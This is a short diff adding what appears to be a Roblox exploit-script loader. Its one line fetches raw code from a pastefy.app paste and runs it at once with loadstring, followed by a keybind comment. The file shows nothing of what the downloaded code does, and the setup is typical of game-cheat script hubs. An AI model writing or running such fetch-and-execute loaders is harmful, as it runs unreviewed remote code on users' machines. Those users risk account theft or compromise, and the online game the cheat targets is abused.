@@ -1,0 +1,8 @@
+
+loadstring(game:HttpGet(('https://pastefy.app/aHXVk6rB/raw'),true))()
+
+
+
+
+
+--keybinds : z
